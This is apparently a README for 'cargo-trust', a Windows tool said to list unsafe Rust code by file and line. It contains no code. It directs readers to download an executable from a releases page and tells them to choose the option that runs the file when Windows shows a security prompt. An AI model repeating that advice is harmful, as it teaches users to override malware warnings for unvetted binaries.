# 🛡️ cargo-trust - Find unsafe Rust code fast

[Download cargo-trust](https://github.com/vaulted-timbalecase456/cargo-trust/releases)  
![Download](https://img.shields.io/badge/Download-cargo--trust-blue?style=for-the-badge)

## 🚀 Getting Started

cargo-trust helps you check a Rust project for unsafe code. It scans your codebase and lists each unsafe block, function, trait, and implementation with line numbers.

If you work with Rust and want a simple way to review code for risk, this tool gives you a clear report you can read right away.

## 📥 Download for Windows

1. Open the [releases page](https://github.com/vaulted-timbalecase456/cargo-trust/releases).
2. Find the latest release.
3. Download the Windows file for your PC. It is often a `.exe` or `.zip` file.
4. If you get a `.zip` file, open it and extract the app.
5. Double-click the app to start it.

If Windows shows a security prompt, choose the option that lets you run the file.

## 🖥️ What You Need

- Windows 10 or Windows 11
- A standard desktop or laptop PC
- A Rust project folder to scan
- Enough space to store the app and its reports

cargo-trust does not need a complex setup. You point it at a Rust codebase, then it checks the files for unsafe use.

## 🔍 What cargo-trust Checks

cargo-trust looks for:

- `unsafe` blocks
- `unsafe` functions
- `unsafe` traits
- `unsafe` implementations

It also shows:

- the file name
- the line number
- the exact code area that needs review

This makes it easier to spot code that may need extra care during an audit.

## 🛠️ How to Use It

1. Open the folder that contains your Rust project.
2. Start cargo-trust.
3. Select or enter the project path when asked.
4. Let the scan finish.
5. Read the report and review the line numbers listed for each finding.

If you want to scan a whole workspace, point the tool at the main folder. It will check subfolders too.

## 📂 Example Scan Result

A report may show results like this:

- `src/main.rs:42` — unsafe block
- `src/lib.rs:88` — unsafe function
- `src/platform/mod.rs:17` — unsafe implementation

This format helps you move from the report to the code without guesswork.

## 🧭 Best Way to Review Findings

When you see a finding, open the file in your editor and go to the line number.

Then check:

- why the unsafe code exists
- whether it can be removed
- whether it needs a comment or review
- whether a safe alternative exists

If you are checking code before release, focus on the parts that touch memory, raw pointers, or low-level system calls.

## ⚙️ Common Use Cases

cargo-trust fits well when you want to:

- review your own Rust project before shipping it
- scan a team project for unsafe code
- check code during a security review
- get a quick list of risky areas in a codebase
- track unsafe code across many folders

It works as a simple audit helper for Rust projects of many sizes.

## 📁 Suggested Folder Setup

You can keep cargo-trust in a simple folder like this:

- `Downloads`
- `Tools`
- `Rust-Audits`

You can place the app there and run it when needed. If you scan many projects, keep each report in its own folder so it stays easy to read.

## 🔐 Why This Tool Helps

Unsafe code can be valid in Rust, but it needs close review. A tool that finds it for you saves time and reduces missed spots.

cargo-trust gives you:

- a fast scan
- clear file paths
- precise line numbers
- a plain report you can share

That makes it easier to review a project without reading every file by hand.

## 🧪 Tips for First-Time Users

- Start with one small project first
- Review the report before scanning a large workspace
- Keep the project path simple
- Use the line numbers to jump straight to the code
- Save the report so you can compare future scans

If you are new to Rust, this tool can still help because it points to the exact files that need attention.

## 🧰 Troubleshooting

### The app does not open

- Check that the download finished
- Make sure you opened the right file
- If the file is in a `.zip`, extract it first
- Try running it again as the current user

### The scan does not find your project

- Confirm that you selected the correct folder
- Make sure the folder contains Rust source files
- Check that the project is not empty
- Try scanning the main project folder instead of a subfolder

### The report looks empty

- The project may not use any unsafe code
- You may have scanned the wrong folder
- Run the scan again and confirm the path

## 🧾 What the Output Means

Each result points to code that may need review. The line number helps you find the exact spot.

Common parts of the output include:

- file path
- line number
- code type
- short note or label

This makes the scan useful even if you do not know Rust well. You can still hand the report to a developer or auditor.

## 🔄 Keeping It Updated

Check the releases page from time to time for newer builds. If a new version appears, download it from the same page and replace the older copy.

[Visit the releases page](https://github.com/vaulted-timbalecase456/cargo-trust/releases)

## 📌 Project Focus

cargo-trust is built for:

- Rust code audits
- unsafe code review
- project scanning
- security checks
- developer tools

It helps you look through a codebase with less manual work and gives you a clear place to start your review.